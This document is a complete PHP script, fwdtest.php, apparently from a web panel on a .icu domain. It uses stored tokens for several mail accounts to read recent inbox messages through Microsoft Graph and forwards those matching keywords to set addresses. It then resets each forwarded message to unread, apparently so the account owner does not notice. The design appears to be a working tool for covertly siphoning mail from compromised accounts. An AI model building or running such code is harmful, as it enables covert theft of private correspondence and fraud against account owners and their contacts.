<?php
/**
 * fwdtest.php — directly tests and runs forwarding rules
 * Delete this file after testing.
 * Usage: visit https://rfpcokxs.icu/mail-php/fwdtest.php
 */
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/auth/Auth.php';
require_once __DIR__ . '/auth/Storage.php';
require_once __DIR__ . '/auth/Portal.php';
require_once __DIR__ . '/Graph.php';

Portal::guard();

$rules    = Storage::read(RULES_FILE);
$accounts = Auth::getAccounts();
$log      = [];
$errors   = [];

$doForward = isset($_GET['run']);

foreach ($accounts as $acc) {
    $id = $acc['id'];
    $applicable = array_filter($rules, function($r) use ($id) {
        return ($r['active'] ?? true) && ($r['account_id'] === $id || ($r['all_accounts'] ?? false));
    });
    if (!$applicable) continue;

    try {
        $token = Auth::getToken($id);
        if (!$token) { $errors[] = "No token for {$acc['email']}"; continue; }

        $emails = Graph::getEmailsSince('inbox', date('Y-m-d\TH:i:s\Z', strtotime('-48 hours')), 20, $id);
        $emailList = $emails['value'] ?? [];

        foreach ($emailList as $email) {
            foreach ($applicable as $rule) {
                $keyword  = strtolower(trim($rule['keyword'] ?? ''));
                $matchIn  = $rule['match_in'] ?? ['subject','body','from'];
                $haystack = '';
                if (in_array('subject',$matchIn)) $haystack .= ' '.strtolower($email['subject'] ?? '');
                if (in_array('body',   $matchIn)) $haystack .= ' '.strtolower($email['bodyPreview'] ?? '');
                if (in_array('from',   $matchIn)) $haystack .= ' '.strtolower($email['from']['emailAddress']['address'] ?? '');

                if ($keyword && strpos($haystack, $keyword) !== false) {
                    $entry = [
                        'account' => $acc['email'],
                        'subject' => $email['subject'],
                        'keyword' => $rule['keyword'],
                        'forward_to' => $rule['forward_to'],
                        'email_id' => $email['id'],
                    ];
                    if ($doForward) {
                        try {
                            Graph::forwardEmail($email['id'], $rule['forward_to'],
                                "Auto-forwarded: matched keyword \"{$rule['keyword']}\"", $id);
                            // Force unread after forwarding
                            try { Graph::markRead($email['id'], false, $id); } catch(Exception $e) {}
                            $entry['status'] = '✅ FORWARDED';
                        } catch (Exception $e) {
                            $entry['status'] = '❌ ERROR: ' . $e->getMessage();
                        }
                    } else {
                        $entry['status'] = '⚠️ DRY RUN (add ?run=1 to actually forward)';
                    }
                    $log[] = $entry;
                    break;
                }
            }
        }
    } catch (Exception $e) {
        $errors[] = "Account {$acc['email']}: " . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>Forwarding Test</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#0d0d14;color:#e8e8f0;padding:2rem;max-width:900px;margin:0 auto}
h2{color:#f5c842}
table{width:100%;border-collapse:collapse;margin:1rem 0}
th{background:#1a1a2e;padding:.6rem 1rem;text-align:left;font-size:.75rem;color:#888;text-transform:uppercase}
td{padding:.6rem 1rem;border-bottom:1px solid #222;font-size:.82rem}
.ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}
.btn{display:inline-block;background:#f5c842;color:#0d0d14;padding:.6rem 1.5rem;border-radius:6px;text-decoration:none;font-weight:700;margin:.5rem .5rem .5rem 0}
.btn-red{background:#ef4444;color:#fff}
pre{background:#111;padding:1rem;border-radius:6px;font-size:.75rem;overflow-x:auto}
</style>
</head>
<body>
<h2>📧 Forwarding Rules Test</h2>
<p style="color:#888">Rules: <strong style="color:#f5c842"><?= count($rules) ?></strong> &nbsp;|&nbsp; 
Accounts: <strong style="color:#f5c842"><?= count($accounts) ?></strong></p>

<?php if (!$doForward): ?>
<a class="btn" href="?run=1">▶ Run Forwarding Now</a>
<?php else: ?>
<a class="btn" href="fwdtest.php">🔁 Dry Run Again</a>
<a class="btn btn-red" href="?run=1">▶ Forward Again</a>
<?php endif; ?>

<?php if ($errors): ?>
<h3 style="color:#f87171">Errors</h3>
<pre><?= htmlspecialchars(implode("\n", $errors)) ?></pre>
<?php endif; ?>

<?php if (!$log): ?>
<p style="color:#888;margin-top:2rem">No keyword matches found in the last 48 hours.</p>
<?php else: ?>
<h3>Matches (<?= count($log) ?>)</h3>
<table>
<tr><th>Account</th><th>Subject</th><th>Keyword</th><th>Forward To</th><th>Status</th></tr>
<?php foreach ($log as $row): ?>
<tr>
  <td><?= htmlspecialchars($row['account']) ?></td>
  <td><?= htmlspecialchars($row['subject']) ?></td>
  <td><code><?= htmlspecialchars($row['keyword']) ?></code></td>
  <td><?= htmlspecialchars($row['forward_to']) ?></td>
  <td class="<?= strpos($row['status'],'✅')!==false?'ok':(strpos($row['status'],'❌')!==false?'err':'warn') ?>">
    <?= htmlspecialchars($row['status']) ?>
  </td>
</tr>
<?php endforeach; ?>
</table>
<?php endif; ?>

<h3 style="margin-top:2rem">Active Rules</h3>
<pre><?= htmlspecialchars(json_encode($rules, JSON_PRETTY_PRINT)) ?></pre>
</body>
</html>
